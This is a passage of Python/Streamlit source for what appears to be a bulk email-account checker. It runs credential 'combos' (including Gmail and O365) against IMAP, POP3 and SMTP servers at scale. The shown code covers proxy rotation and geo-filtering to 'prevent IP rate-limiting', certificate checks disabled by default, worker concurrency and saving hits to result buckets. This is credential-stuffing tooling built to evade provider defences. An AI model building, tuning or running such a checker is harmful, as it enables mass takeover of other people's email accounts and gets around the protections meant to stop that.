    """Country for GEO_CALL.  .com/.net ISPs are covered by the hint map."""
    d = (domain or "").lower().strip()
    if d in DOMAIN_COUNTRY_HINTS:
        return DOMAIN_COUNTRY_HINTS[d]
    for part in reversed(d.split(".")):
        if part in TLD_COUNTRY:
            return TLD_COUNTRY[part]
    return None


def enrich_proxy_geo(proxies, max_workers=8):
    """Fill country/region for nodes that do not have a usable answer.

    IT NEVER DOWNGRADES NOW. The old code assigned the lookup result
    unconditionally, so a single failed lookup replaced a good country with
    "Unknown". The node then matched its own "country is Unknown" retry filter,
    failed again and was overwritten again - which is why only the first user in
    a batch ever kept a country and every user after showed Unknown.

    A known country is only ever replaced by another known country, a region is
    only written when it is real, and a node that keeps failing gives up after
    GEO_TRIES_MAX cycles instead of being asked for ever.
    """
    todo = []
    for p in (proxies or []):
        meta = proxy_meta.get(p) or {}
        country = str(meta.get("country") or "").strip()
        region = str(meta.get("region") or "").strip()
        if country and country != "Unknown" and region and region != "Unknown":
            continue
        if int(_GEO_TRIES.get(p, 0)) >= GEO_TRIES_MAX:
            continue
        info = parse_proxy(p)
        if info and info.get("host"):
            todo.append((p, info["host"]))
    if not todo:
        return

    def _one(item):
        p, host = item
        return p, host, geo_lookup(host)

    fixed = 0
    try:
        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            for p, host, (country, region) in ex.map(_one, todo):
                if not country or country == "Unknown":
                    with _GEO_LOCK:
                        _GEO_TRIES[p] = int(_GEO_TRIES.get(p, 0)) + 1
                    continue
                with proxy_lock:
                    m = proxy_meta.setdefault(
                        p, {"fails": 0, "success": 0, "score": 60, "latency_ms": 0})
                    m["country"] = country
                    if region and region != "Unknown":
                        m["region"] = region
                with _GEO_LOCK:
                    _GEO_TRIES.pop(p, None)
                fixed += 1
    except Exception as e:
        log_startup(f"WARNING: proxy geo enrichment error: {e}", quiet=True)
    if fixed:
        log_startup(f"Proxy geo: resolved {fixed} of {len(todo)} node(s).", quiet=True)


def get_available_countries_with_scores():
    try:
        raw = load_proxies()
        country_scores = defaultdict(list)
        for p in raw:
            meta = proxy_meta.get(p, {})
            c = str(meta.get("country", "Unknown")).upper()
            if c == "UNKNOWN" or not c:
                info = parse_proxy(p)
                if info:
                    c = geo_lookup(info["host"])[0].upper()
            country_scores[c].append(meta.get("score", 50))
        ranked = sorted(((c, sum(s) / len(s)) for c, s in country_scores.items() if s),
                        key=lambda x: x[1], reverse=True)
        return [c for c, _ in ranked if c != "UNKNOWN"] + (["UNKNOWN"] if "UNKNOWN" in country_scores else [])
    except Exception:
        return []


if "pool_pick" not in str_lit.session_state:
    str_lit.session_state.pool_pick = None

selected_countries = list(str_lit.session_state.picked_countries)
selected_mix_countries = list(str_lit.session_state.picked_countries)
pool_mode = str_lit.session_state.pool_mode

if str_lit.session_state.pool_locked:
    str_lit.sidebar.success(f"Pool set: {pool_mode}")
    if pool_mode in ("country", "mix"):
        str_lit.sidebar.caption("Picked: " + ", ".join(str_lit.session_state.picked_countries))
    if str_lit.sidebar.button("Change pool"):
        str_lit.session_state.pool_locked = False
        str_lit.session_state.pool_pick = None
        str_lit.rerun()
else:
    str_lit.sidebar.caption("Tap one")
    for _lbl, _mode in (("all", "all"), ("us_only", "us_only"),
                        ("country", "country"), ("mix", "mix")):
        if str_lit.sidebar.button(_lbl, key=f"pool_btn_{_mode}"):
            if _mode in ("country", "mix"):
                str_lit.session_state.pool_pick = _mode
            else:
                str_lit.session_state.pool_mode = _mode
                str_lit.session_state.pool_locked = True
                str_lit.session_state.pool_pick = None
            str_lit.rerun()
    choice = str_lit.session_state.pool_pick
    if choice in ("country", "mix"):
        available_countries = get_available_countries_with_scores() or ["US"]
        _raw_for_scores = load_proxies() if choice == "mix" else []
        with str_lit.sidebar.form("pool_pick_form"):
            picked = []
            for c in available_countries:
                label = c
                if choice == "mix":
                    scores = [proxy_meta.get(p, {}).get("score", 0) for p in _raw_for_scores
                              if str(proxy_meta.get(p, {}).get("country", "")).upper() == c]
                    label = f"{c}  score={max(scores) if scores else 0}"
                if str_lit.checkbox(label, value=c in str_lit.session_state.picked_countries,
                                    key=f"poolchk_{choice}_{c}"):
                    picked.append(c)
            if str_lit.form_submit_button("Done"):
                if not picked:
                    str_lit.sidebar.error("Pick at least one country")
                else:
                    str_lit.session_state.pool_mode = choice
                    str_lit.session_state.picked_countries = picked
                    str_lit.session_state.pool_locked = True
                    str_lit.session_state.pool_pick = None
                    str_lit.rerun()
# @@END 052 CACHE_PROXY_PARSE_PICKER

# @@BLOCK 053 SIDEBAR_SWITCHES deps=019,043,044,051
str_lit.sidebar.markdown("---")

use_proxy = instant_help(
    "use_proxy",
    "Route all checker requests through proxy nodes to prevent IP rate-limiting. "
    "UNCHECK for a fully direct connection.",
    "Use Proxy", widget_type="checkbox", value=True)
retry_cf = instant_help(
    "retry_cf",
    "After the proxy route fails with a NETWORK error, make one extra pass with a "
    "direct connection.",
    "Retry CF (Direct Retry)", widget_type="checkbox", value=True)
self_signed = instant_help(
    "self_signed",
    "REAL switch. TICKED (default) = accept self-signed / mismatched certs, no "
    "verification attempted. UNTICKED = VERIFY, and if verification fails the handshake "
    "is retried unverified - unless TLS_STRICT is on, in which case the failure is raised "
    "so a bad cert is actually rejected.",
    "Allow Self-Signed", widget_type="checkbox", value=True)
proxy_test_flight = instant_help(
    "proxy_test_flight",
    "Probe every proxy for liveness before it enters the live pool. KEEP THIS ON - it is "
    "what makes Fetch & Test produce a pool that actually works.",
    "Test Flight", widget_type="checkbox", value=True)
skip_app = instant_help(
    "skip_app",
    "Filter out accounts requiring explicit app passwords or token generation upfront. "
    "OFF by default so Gmail/O365 combos are actually CHECKED rather than bucketed away.",
    "Skip Strict App-Only Providers", widget_type="checkbox", value=False)
debug_mode = instant_help(
    "debug_mode",
    "Stream verbose logs and error tracing directly into the UI interface.",
    "Enable Debug Mode", widget_type="checkbox", value=True)

# instant_help() returns None when its internal try/except fires, and `not None` is
# True - which silently flips ALLOW_SELF_SIGNED to False and turns verification ON
# behind your back, in build_cfg()'s "TLS_STRICT": not self_signed.
self_signed = True if self_signed is None else self_signed
# v13.42: the same hazard applies to every other instant_help() widget and they
# were left unguarded.  A None here silently turns the proxy OFF, the direct
# retry OFF, the test flight OFF, the app-skip OFF and debug OFF in build_cfg().
use_proxy = True if use_proxy is None else use_proxy
retry_cf = True if retry_cf is None else retry_cf
proxy_test_flight = True if proxy_test_flight is None else proxy_test_flight
skip_app = False if skip_app is None else skip_app
debug_mode = True if debug_mode is None else debug_mode

_seed_widget("ui_starttls")
try_starttls_ui = str_lit.sidebar.toggle(
    "Enable STARTTLS + plaintext fallback (143 / 110)", key="ui_starttls",
    help="If implicit TLS on 993/995 fails, retry the host over STARTTLS, then over "
         "plaintext. These rungs get a shorter leash (LEGACY_RUNG_TIMEOUT) because "
         "143/110 are often firewalled from cloud egress."
)

_seed_widget("ui_proxy_mode", choices=("aggressive", "fallback", "sticky", "off"))
resolved_proxy_mode = str_lit.sidebar.selectbox(
    "Proxy Mode Engine:", options=["aggressive", "fallback", "sticky", "off"],
    key="ui_proxy_mode",
    help="aggressive: proxy only. fallback: proxy then direct (default, universal). "
         "sticky: one proxy per worker thread. off: never use proxies. With a "
         "provider-wide 407, 'off' is the only mode that can finish a run."
)
# @@END 053 SIDEBAR_SWITCHES

# @@BLOCK 054 BUILD_CFG deps=011,020,046,047,048,049,050,051,052,053
def build_cfg():
    # v13.53: MAX_WORKERS_MAX was published here and read by NOTHING - block 106
    # uses a hardcoded 100/35 ceiling instead - so it is gone rather than left to
    # look authoritative. MAX_WORKERS_START is the only worker number that means
    # anything, and it is the slider verbatim.
    return {
        "MODE_NAME": engine_config.mode_name,
        "PROTOCOLS": list(protocol_pick or PROTOCOL_SELECTION_DEFAULT),
        "MAX_WORKERS_START": workers,
        "TIMEOUT": timeout,
        "ACCOUNT_DEADLINE": deadline,
        "MAX_ACCOUNTS": max_acc,
        "BLACKLIST_CF": blacklist_cf,
        "PROXY_MODE": resolved_proxy_mode if use_proxy else "off",
        "RETRY_CONNECTION_FAILED": 1 if retry_cf else 0,
        "ALLOW_SELF_SIGNED": self_signed,
        # unticking "Allow Self-Signed" means STRICT - no silent fallback to unverified.
        "TLS_STRICT": not self_signed,
        "TRY_STARTTLS": try_starttls_ui,
        "TRY_ALT_USERNAME": try_alt_username_ui,
        "CONFIRM_WRONG_ACROSS_HOSTS": confirm_wrong_ui,
        "MAX_HOSTS_PER_DOMAIN": max_hosts_per_domain,
        "PROXY_TEST_FLIGHT": proxy_test_flight,
        "SKIP_STRICT_APP_PROVIDERS": skip_app,
        "DEBUG": debug_mode,
        "MIN_PROXY_SCORE": min_proxy_score,
        "PROXY_PRECHECK_TIMEOUT": proxy_precheck_timeout,
        "PROBE_TIMEOUT": probe_timeout_ui,
        "PROBE_TARGET": probe_target_ui,
        "PROBE_STRICT": probe_strict_ui,
        "PROBE_MAX_TARGETS": probe_max_targets_ui,
        "PROBE_SECOND_SCHEME": probe_second_scheme_ui,
        "PROBER_IDLE_ENABLED": prober_idle_ui,
        "PROBE_SAMPLE_MAX": probe_sample_ui,
        "MAIL_SPOT_CHECK": mail_spot_ui,
        "DEDUPE_PROXIES": dedupe_proxies_ui,
        "ALLOW_BLACKLIST_IPS": allow_blacklist_ips,
        "QUARANTINE_407": proxy_quarantine_ui,
        "HOST_CONCURRENCY": host_concurrency_ui,
        "PROXY_IP_CONCURRENCY": proxy_ip_concurrency_ui,
        "PROXY_SUBUSER_CONCURRENCY": proxy_subuser_concurrency_ui,
        "PROXY_CONCURRENCY": proxy_concurrency_ui,
        "DIRECT_FIRST": direct_first_ui,
        "SAME_HOST_RETRIES": same_host_retries_ui,
        "MAX_ROTATIONS": max_rotations_ui,
        "CHECK_PASS2": pass2_ui,
        "POOL_MODE": pool_mode,
        "SELECTED_COUNTRIES": selected_countries,
        "SELECTED_MIX_COUNTRIES": selected_mix_countries,
        "DYNAMIC_WORKER_SCALING": dynamic_worker_scaling,
        "CUSTOM_WHITELIST": [d.strip().lower() for d in custom_whitelist_input.split(",") if d.strip()],
        "CUSTOM_BLACKLIST": [d.strip().lower() for d in custom_blacklist_input.split(",") if d.strip()],
        "PROXY_FILE": user_file("proxies.txt"),
        "PROXY_ALL_FILE": user_file("proxies_all.txt"),
        "PROXY_KEYMAP_FILE": user_file("proxy_key_map.json"),
        "RESULTS_DIR": user_file("mail_results"),
        "CACHE_FILE": user_file("domain_cache.json"),
        "PROXY_META_FILE": user_file("proxy_meta.json"),
        "MAX_PROXY_TRIES": engine_config.max_retries,
        "PROXY_CONNECT_TIMEOUT": engine_config.connect_timeout,
        "FAST_MODE": engine_config.fast_mode,
        "FAILURE_COOLDOWN": engine_config.failure_cooldown,
        "RANDOM_ROTATION": proxy_random_rotation,
        "GEO_CALL": geo_call_proxy,
        "CONNECTION_HINT": my_connection,
        "SMTP_CHECK": smtp_precheck_ui,
    }
# @@END 054 BUILD_CFG

# @@BLOCK 055 APPLY_SETTINGS deps=020,040,054
# FIX ISO-2 (v13.49): applied_cfg lives in session_state and RESULTS_DIR is baked
# into it from user_file() at Apply time. It was only rebuilt when MISSING or when
# the version changed - so after "Forget this passkey" and a second unlock in the
# same tab, RESULTS_DIR still pointed at the PREVIOUS user's directory and every
# bucket file was written there, while clean_valid and the resume record followed
# the new user. The owner is now part of the rebuild condition.
_cfg_owner = _cache_owner()

if "applied_cfg" not in str_lit.session_state:
    str_lit.session_state.applied_cfg = build_cfg()
    str_lit.session_state.applied_cfg_version = CFG_VERSION
    str_lit.session_state.applied_cfg_owner = _cfg_owner
elif str_lit.session_state.get("applied_cfg_version") != CFG_VERSION:
    _migrated = build_cfg()
    str_lit.session_state.applied_cfg = _migrated
    str_lit.session_state.applied_cfg_version = CFG_VERSION
    str_lit.session_state.applied_cfg_owner = _cfg_owner
    log_startup(f"Config migrated to v{CFG_VERSION} defaults "
                f"(untouched widgets adopted the new defaults).")
elif str_lit.session_state.get("applied_cfg_owner") != _cfg_owner:
    _migrated = build_cfg()
    str_lit.session_state.applied_cfg = _migrated
    str_lit.session_state.applied_cfg_version = CFG_VERSION
    str_lit.session_state.applied_cfg_owner = _cfg_owner
    log_startup("Config re-pathed: the unlocked user changed, so RESULTS_DIR was "
                "still pointing at the previous user's directory.")

# v13.53: block 106's tail trim writes ACCOUNT_DEADLINE / SAME_HOST_RETRIES /
# MAX_ROTATIONS straight into CFG while the run is live. CFG IS applied_cfg, so
# the naive build_cfg() != applied_cfg comparison went true the moment the tail
# armed and the sidebar shouted "You have UNAPPLIED settings changes" for the
# last cohort of every run - for changes the user never made. Those three keys
# are excluded from the comparison; they are restored in block 106's finally.
_TAIL_CAPPED_KEYS = ("ACCOUNT_DEADLINE", "SAME_HOST_RETRIES", "MAX_ROTATIONS")
_cmp_now = {_k: _v for _k, _v in build_cfg().items() if _k not in _TAIL_CAPPED_KEYS}
_cmp_base = {_k: _v for _k, _v in (str_lit.session_state.applied_cfg or {}).items()
             if _k not in _TAIL_CAPPED_KEYS}
_settings_dirty = _cmp_now != _cmp_base
if _settings_dirty:
    str_lit.sidebar.warning("⚠ You have UNAPPLIED settings changes. Click 💾 Apply Settings.")

_btn_c1, _btn_c2 = str_lit.sidebar.columns(2)
with _btn_c1:
    _apply_clicked = str_lit.button("💾 Apply Settings", type="primary", width="stretch")
with _btn_c2:
    _reset_clicked = str_lit.button(
        "♻️ Reset Defaults", width="stretch",
        help="Restore every setting to the universal default (protocols back to IMAP + POP3).")

# FIX FLASH-2 (v13.61): the confirmation was a bare st.sidebar.success() on the
# line directly above str_lit.rerun(), and a rerun destroys the delta it was drawn
# into - so "Settings applied successfully!" was never once actually seen. It is
# the identical defect block 080 already fixed for the proxy messages: the message
# is carried across the rerun and drawn on the next load.
_settings_flash = str_lit.session_state.pop("_settings_flash", None)
if _settings_flash:
    _sfl_lvl, _sfl_msg = _settings_flash
    getattr(str_lit.sidebar, _sfl_lvl, str_lit.sidebar.info)(_sfl_msg)

if _reset_clicked:
    str_lit.session_state["_bb_reset_pending"] = True
    str_lit.session_state["_settings_flash"] = (
        "success", "Every setting restored to its universal default and saved.")
    str_lit.rerun()

if _apply_clicked:
    str_lit.session_state.applied_cfg = build_cfg()
    str_lit.session_state.applied_cfg_version = CFG_VERSION
    str_lit.session_state.applied_cfg_owner = _cfg_owner
    _reset_gates()
    _settings_saved = _save_settings_to_disk("apply")
    str_lit.session_state["_settings_flash"] = (
        ("success", "Settings applied successfully - saved to your own settings file, "
                    "they will survive a refresh.")
        if _settings_saved else
        ("warning", "Settings applied for this session, but settings.json could NOT be "
                    "written - they will reset on the next refresh."))
    log_startup("User applied new configuration settings via sidebar control panel "
                f"(persisted={_settings_saved}).")
    str_lit.rerun()

CFG = str_lit.session_state.applied_cfg

for _k, _v in (
    ("ALLOW_SELF_SIGNED", True), ("TLS_STRICT", False), ("TRY_STARTTLS", True),
    ("TRY_ALT_USERNAME", True), ("CONFIRM_WRONG_ACROSS_HOSTS", True),
    ("MAX_HOSTS_PER_DOMAIN", 3), ("TIMEOUT", ATTEMPT_TIMEOUT_NORMAL),
    ("ACCOUNT_DEADLINE", DEADLINE_NORMAL), ("PROXY_CONNECT_TIMEOUT", 8.0),
    ("FAILURE_COOLDOWN", FAILURE_COOLDOWN_DEFAULT),
    ("FAST_MODE", False), ("BLACKLIST_CF", BLACKLIST_CF_DEFAULT), ("DEBUG", False),
    ("PROXY_TEST_FLIGHT", True),
    ("RETRY_CONNECTION_FAILED", 1), ("MAX_ACCOUNTS", 5000),
    ("MAX_WORKERS_START", WORKERS_NORMAL),
    ("DYNAMIC_WORKER_SCALING", True), ("PROXY_MODE", "fallback"),
    ("ALLOW_BLACKLIST_IPS", False),
    ("RANDOM_ROTATION", True), ("GEO_CALL", False), ("CONNECTION_HINT", "Auto"),
    ("SMTP_CHECK", False),
    ("QUARANTINE_407", True), ("MIN_PROXY_SCORE", MIN_PROXY_SCORE_DEFAULT),
    ("PROXY_PRECHECK_TIMEOUT", PROXY_PRECHECK_TIMEOUT_DEFAULT),
    ("PROBE_TIMEOUT", PROBE_TIMEOUT_DEFAULT), ("PROBE_TARGET", PROBE_TARGET_DEFAULT),
    ("PROBE_STRICT", PROBE_STRICT_DEFAULT), ("DEDUPE_PROXIES", DEDUPE_PROXIES_DEFAULT),
    ("PROBE_MAX_TARGETS", PROBE_MAX_TARGETS_DEFAULT),
    ("PROBE_SECOND_SCHEME", PROBE_SECOND_SCHEME_DEFAULT),
    ("PROBER_IDLE_ENABLED", PROBER_IDLE_ENABLED_DEFAULT),
    ("PROBE_SAMPLE_MAX", 0),
    ("MAIL_SPOT_CHECK", MAIL_SPOT_CHECK_DEFAULT),
    ("MAX_ROTATIONS", MAX_ROTATIONS_DEFAULT),
    ("CHECK_PASS2", CHECK_PASS2_DEFAULT),
    ("HOST_CONCURRENCY", HOST_CONCURRENCY_DEFAULT),
    ("PROXY_CONCURRENCY", PROXY_CONCURRENCY_DEFAULT),
    ("PROXY_IP_CONCURRENCY", PROXY_IP_CONCURRENCY_DEFAULT),
    ("PROXY_SUBUSER_CONCURRENCY", PROXY_SUBUSER_CONCURRENCY_DEFAULT),
    ("DIRECT_FIRST", True), ("SAME_HOST_RETRIES", SAME_HOST_RETRIES_DEFAULT),
    ("SKIP_STRICT_APP_PROVIDERS", False),
    ("PROTOCOLS", list(PROTOCOL_SELECTION_DEFAULT)),
):
    CFG.setdefault(_k, _v)

# The paths are re-asserted every run, so an applied_cfg inherited from a
# previous user can never outlive the switch even if a branch above was skipped.
CFG["RESULTS_DIR"] = user_file("mail_results")
CFG["PROXY_FILE"] = user_file("proxies.txt")
CFG["PROXY_ALL_FILE"] = user_file("proxies_all.txt")
CFG["PROXY_KEYMAP_FILE"] = user_file("proxy_key_map.json")
CFG["CACHE_FILE"] = user_file("domain_cache.json")
CFG["PROXY_META_FILE"] = user_file("proxy_meta.json")

STATE["cfg"] = CFG
# FIX ISO-6 (v13.59): seed the SCRIPT thread too. Without this live_cfg() fell
# straight through to STATE["cfg"], which any other session's rerun overwrites.
seed_task_cfg(CFG)

log_startup(
    f"ACTIVE CONFIG -> protocols={CFG.get('PROTOCOLS')} mode={CFG.get('MODE_NAME')} "
    f"workers={CFG.get('MAX_WORKERS_START')} "
    f"deadline={CFG.get('ACCOUNT_DEADLINE')}s timeout={CFG.get('TIMEOUT')}s "
    f"proxy_mode={CFG.get('PROXY_MODE')} hosts/domain={CFG.get('MAX_HOSTS_PER_DOMAIN')} "
    f"starttls={CFG.get('TRY_STARTTLS')} alt_user={CFG.get('TRY_ALT_USERNAME')} "
    f"confirm_wrong={CFG.get('CONFIRM_WRONG_ACROSS_HOSTS')} "
    f"self_signed={CFG.get('ALLOW_SELF_SIGNED')} tls_strict={CFG.get('TLS_STRICT')} "
    f"allow_blacklist={CFG.get('ALLOW_BLACKLIST_IPS')} "
    f"random_rotation={CFG.get('RANDOM_ROTATION')} geo_call={CFG.get('GEO_CALL')} "
    f"smtp_precheck={CFG.get('SMTP_CHECK')} quarantine_407={CFG.get('QUARANTINE_407')} "
    f"probe_target={CFG.get('PROBE_TARGET')} probe_timeout={CFG.get('PROBE_TIMEOUT')}s "
    f"probe_strict={CFG.get('PROBE_STRICT')} dedupe={CFG.get('DEDUPE_PROXIES')} "
    f"probe_max_targets={CFG.get('PROBE_MAX_TARGETS')} "
    f"probe_scheme2={CFG.get('PROBE_SECOND_SCHEME')} "
    f"prober_idle={CFG.get('PROBER_IDLE_ENABLED')} "
    f"probe_sample={CFG.get('PROBE_SAMPLE_MAX')} mail_spot={CFG.get('MAIL_SPOT_CHECK')} "
    f"max_rotations={CFG.get('MAX_ROTATIONS')} check_pass2={CFG.get('CHECK_PASS2')} "
    f"host_conc={CFG.get('HOST_CONCURRENCY')} ip_conc={CFG.get('PROXY_IP_CONCURRENCY')} "
    f"subuser_conc={CFG.get('PROXY_SUBUSER_CONCURRENCY')} "
    f"proxy_conc={CFG.get('PROXY_CONCURRENCY')} "
    f"direct_first={CFG.get('DIRECT_FIRST')} same_host_retries={CFG.get('SAME_HOST_RETRIES')}"
)
# @@END 055 APPLY_SETTINGS

# @@BLOCK 056 THEME_STUDIO deps=031,055
with str_lit.sidebar.expander("🎨 Theme Studio & Colours", expanded=False):
    th = str_lit.session_state.theme

    _preset_names = list(THEME_PRESETS.keys())
    _seed = {
        "th_preset": th.get("preset", "Aurora") if th.get("preset", "Aurora") in _preset_names else "Aurora",
        "th_g1": th["g1"], "th_g2": th["g2"],
        "th_accent": th["accent"], "th_accent2": th["accent2"],
        "th_bg": th["bg"], "th_panel": th["panel"], "th_text": th["text"],
        "th_radius": int(th.get("radius", 14)),
        "th_glow": bool(th.get("glow", True)),
        "th_glass": bool(th.get("glass", True)),
        "th_animate": bool(th.get("animate", True)),
        "th_hero_title": th.get("hero_title", ""),
        "th_hero_sub": th.get("hero_sub", ""),
    }
    for _k, _v in _seed.items():
        if _k not in str_lit.session_state:
            str_lit.session_state[_k] = _v

    str_lit.selectbox("Preset Gradient", _preset_names, key="th_preset",
                      on_change=_on_preset_change)

    c_a, c_b = str_lit.columns(2)
    with c_a:
        str_lit.color_picker("Gradient Start", key="th_g1")
        str_lit.color_picker("Accent", key="th_accent")
        str_lit.color_picker("Page Background", key="th_bg")
    with c_b:
        str_lit.color_picker("Gradient End", key="th_g2")
        str_lit.color_picker("Accent 2", key="th_accent2")
        str_lit.color_picker("Panel Surface", key="th_panel")

    str_lit.color_picker("Body Text", key="th_text")
    str_lit.slider("Corner Radius", 0, 28, key="th_radius")

    t_a, t_b = str_lit.columns(2)
    with t_a:
        str_lit.toggle("Neon Glow", key="th_glow")
        str_lit.toggle("Glass Blur", key="th_glass")
    with t_b:
        str_lit.toggle("Animated Gradient", key="th_animate")
        str_lit.toggle("Colourised Logs", key="colorize_logs")

    str_lit.text_input("Hero Title", key="th_hero_title")
    str_lit.text_input("Hero Subtitle", key="th_hero_sub")

    b_a, b_b = str_lit.columns(2)
    with b_a:
        str_lit.button("♻️ Reset Theme", on_click=_reset_theme, width="stretch")
    with b_b:
        str_lit.download_button(
            "⬇️ Export Theme",
            data=json.dumps(str_lit.session_state.theme, indent=2),
            file_name="theme.json", mime="application/json",
            width="stretch",
        )

    _sync_theme_from_widgets()
# @@END 056 THEME_STUDIO

# @@BLOCK 057 BOOT_RENDER deps=033,034,055,056
_theme = str_lit.session_state.theme

str_lit.markdown(theme_css(_theme), unsafe_allow_html=True)
render_hero(_theme)

# Display Fit controls belong UNDER the header. fit() in block 007 injects the
# CSS only; the panel is drawn here.
auth.fit_panel(str_lit)

# v13.70: THE BELL. Under the header and ahead of every other control, so it is
# the first thing reachable on a phone.
#
# notify.py is a plain module (like runstate.py), every call in it is optional,
# and both guards are hasattr() - a module cached from before this build would
# otherwise answer AttributeError, and a bare `notify.render_bell` expression is
# magic-written by Streamlit through st.help -> ast.parse, which can raise
# IndentationError on the enclosing try. Reloading notify does NOT collide with
# the gated auth-module reload needle, which must stay at one occurrence.
#
# A stale or broken notify degrades to "no bell", never to a dead page.
import notify

if not (hasattr(notify, "render_bell") and hasattr(notify, "system_tick")):
    notify = importlib.reload(notify)

_nb_l, _nb_r = str_lit.columns([0.24, 0.76])
with _nb_l:
    notify.render_bell(str_lit)

# The thresholds are sampled here on every rerun, and again from the run
# checkpoint (block 106) - the script does not rerun while a run works, so the
# checkpoint is the only thing that can notice a squeeze mid-run. notify throttles
# both per user and swallows everything, so neither call can cost the page.
try:
    notify.system_tick()
except Exception:
    pass

try:
    os.makedirs(CFG["RESULTS_DIR"], exist_ok=True)
    log_startup(f"Verified/Created results directory at '{CFG['RESULTS_DIR']}'.")
except Exception as e:
    log_startup(f"WARNING: Failed to create results directory: {e}")
# @@END 057 BOOT_RENDER

# @@BLOCK 058 FILE_IO deps=039,052
def save_domain_cache():
    try:
        with file_write_lock:
            with cache_lock:
                with open(live_cfg()["CACHE_FILE"], "w", encoding="utf-8") as f:
                    json.dump(domain_cache, f, indent=2)
    except Exception as e:
        warnings.warn(f"Failed to save domain cache: {e}")


def save_proxy_meta():
    """Persist scores, countries, counters AND the last probe verdict, atomically.

    v13.64: this wrote proxy_meta.json and NOTHING ever read it back - so every
    score, every country and every "this node has delivered" count died with the
    process, and block 052 had nothing to restore. It is a VERSIONED ENVELOPE now
    and it carries three things:

        meta    the score table, unchanged in shape
        probe   the last verdict per node, so the tier gate in block 069 is live
                again before the first probe of a new process finishes
        parked  the 407 / 402 park clock, so a spent node stays parked

    Written to a .tmp and os.replace()d, so a teardown mid-write cannot hand
    block 052 a half file. Only keys that are IN the table are written, so the
    payload cannot grow past the pool. Block 052 reads both this shape and the
    old flat dict.

    v13.70 MEM-3: THE INDENT WAS 10x THE FILE. indent=1 spreads every node over
    about twelve lines, so a 3000-node payload was ~700 KB of text and the
    json.dump of it held a second full copy while it serialised - on the script
    thread, after every refresh. Separators only: same data, one line per node.
    """
    _path = _proxy_meta_path()
    _tmp = _path + ".tmp"
    try:
        with file_write_lock:
            with proxy_lock:
                _meta = dict(proxy_meta)
            with probe_stats_lock:
                _probe = {k: dict(v) for k, v in probe_stats.items() if k in _meta}
            _now = time.time()
            try:
                _parked = {k: v for k, v in proxy_407_until.items()
                           if v > _now and k in _meta}
            except Exception:
                _parked = {}
            payload = {"schema": _PROXY_META_SCHEMA,
                       "saved_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                       "meta": _meta, "probe": _probe, "parked": _parked}
            with open(_tmp, "w", encoding="utf-8") as f:
                json.dump(payload, f, separators=(",", ":"))
            os.replace(_tmp, _path)
    except Exception as e:
        warnings.warn(f"Failed to save proxy meta: {e}")


def proxy_is_blocked(proxy_str):
    """True while this node is circuit-broken FOR THIS SESSION.

    v13.70 ISO-13: circuit_breaker_until is a per-user table and this reads it
    from worker threads (block 071 precheck and block 077 burst probe both call
    it). Without the rebind a rerun in another tab pointed the alias at the other
    session's breakers, so one user's dead node read as blocked - or a blocked
    one read as fine - for the duration of that account.
    """
    if not proxy_str:
        return False
    _rebind_scope()
    if live_cfg().get("ALLOW_BLACKLIST_IPS", False):
        return False
    try:
        if proxy_str in circuit_breaker_until and time.time() < circuit_breaker_until[proxy_str]:
            return True
    except Exception:
        pass
    return False


def get_filtered_active_proxies(quiet: bool = False):
    """The pool the engine is allowed to use.  NO silent fallback to the raw list."""
    try:
        raw = load_proxies(quiet=quiet)
        if not raw:
            return []
        try:
            dedupe = bool(live_cfg().get("DEDUPE_PROXIES", DEDUPE_PROXIES_DEFAULT))
        except Exception:
            dedupe = DEDUPE_PROXIES_DEFAULT
        if dedupe:
            raw = list(dict.fromkeys(raw))
        filtered = []
        min_score = live_cfg().get("MIN_PROXY_SCORE", MIN_PROXY_SCORE_DEFAULT)
        mode = live_cfg().get("POOL_MODE", "all")
        chosen_countries = live_cfg().get("SELECTED_COUNTRIES", [])
        chosen_mix = live_cfg().get("SELECTED_MIX_COUNTRIES", [])

        with proxy_lock:
            meta_snapshot = dict(proxy_meta)

        for p in raw:
            if proxy_is_blocked(p):
                continue
            meta = meta_snapshot.get(p, {})
            if meta.get("score", 50) < min_score:
                continue
            country = str(meta.get("country", "Unknown")).upper()
            if mode == "all":
                filtered.append(p)
            elif mode == "us_only":
                # FIX GEO-1 (v13.50): "US" as a SUBSTRING matched AUSTRALIA,
                # AUSTRIA, RUSSIA and BELARUS, so us_only was never US-only.
                if (country in ("US", "USA", "UNITED STATES")
                        or country.startswith("UNITED STATES")):
                    filtered.append(p)
            elif mode == "country":
                if any(cc in country or cc in p.upper() for cc in chosen_countries):
                    filtered.append(p)
            elif mode == "mix":
                if any(mc in country or mc in p.upper() for mc in chosen_mix):
                    filtered.append(p)
            else:
                filtered.append(p)

        # FIX SCORE-3 (v13.49): a node that has EVER passed the probe is never
        # dropped by SCORE. 0 success / N fail lands on 0, and the old rescue only
        # fired when NOTHING had ever passed - so as soon as ONE node succeeded the
        # filter happily kept eleven dead lines and threw away the ten working
        # ones. A proven node is proof; the score is an estimate.
        if raw:
            with proxy_lock:
                _ever = [p for p in raw
                         if int((proxy_meta.get(p) or {}).get("success", 0)) > 0]
            for p in _ever:
                if p not in filtered and not proxy_is_blocked(p):
                    filtered.append(p)

        # FIX SCORE-2: when NOTHING ever passes the probe, every node's score
        # decays with each cycle and the score filter walks the pool down to zero.
        # A uniformly broken pool is still worth more than an empty one.
        if not filtered and raw:
            with proxy_lock:
                any_ok = any(int((proxy_meta.get(p) or {}).get("success", 0)) > 0
                             for p in raw)
            if not any_ok:
                log_startup("WARNING: no node has ever succeeded - score filter "
                            "bypassed so the pool stays usable.", quiet=quiet)
                log_probe_event("score filter bypassed: 0 nodes have any success")
                return list(raw)

        log_startup(f"Proxy filtering complete. Active pool contains {len(filtered)} "
                    f"of {len(raw)} candidate(s) (score/geo filter).", quiet=quiet)
        if not filtered:
            log_startup("WARNING: every candidate was filtered out (min score / pool mode / "
                        "circuit breaker). Returning an EMPTY pool - the raw list is NOT "
                        "used as a silent fallback.", quiet=quiet)
            log_probe_event("proxy filter emptied the pool -> 0 candidates (no raw fallback)")
        return filtered
    except Exception as e:
        log_startup(f"WARNING: Error filtering active proxies: {e}", quiet=quiet)
        return load_proxies(quiet=quiet)


all_proxies = load_proxies()
filtered_pool = []  # never snapshotted at import; refreshed by callers before use
# @@END 058 FILE_IO

# @@BLOCK 059 DNS_CACHE deps=024
_DNS_CACHE = STATE.setdefault("dns_cache", {})
_DNS_TTL = 300.0


def _resolve_cached(host, ttl=_DNS_TTL):
    """Cached gethostbyname.  Returns the IP string, or None on failure."""
    h = (host or "").strip().lower()
    if not h:
        return None
    now = time.time()
    with _host_dns_lock:
        hit = _DNS_CACHE.get(h)
